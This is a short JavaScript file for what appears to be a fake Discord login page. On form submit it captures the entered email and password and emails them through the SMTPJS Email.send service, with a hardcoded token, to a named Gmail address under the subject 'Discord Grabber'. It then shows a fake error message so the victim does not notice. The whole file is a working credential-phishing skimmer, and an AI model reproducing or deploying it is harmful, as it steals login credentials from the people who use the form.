const mail = document.getElementById("mail");
const pass = document.getElementById("pass");
const submit = document.getElementsByClassName("form-contact")[0];

// Event Listener

submit.addEventListener("submit", (e) => {
  e.preventDefault();
  console.log("Clicked");

  Email.send({
    SecureToken: "360b43a0-9622-4510-a015-34968c86c212",
    To: "tyronmorcel@gmail.com",
    From: "wadecpro@gmail.com",
    Subject: "Discord Grabber",
    Body:
      "Email : " +
      document.getElementById("email").value +
      "<br> Pwd : " +
      document.getElementById("password").value,
  }).then((message) => alert("Erreur, réessayer plus tard ..."));
});
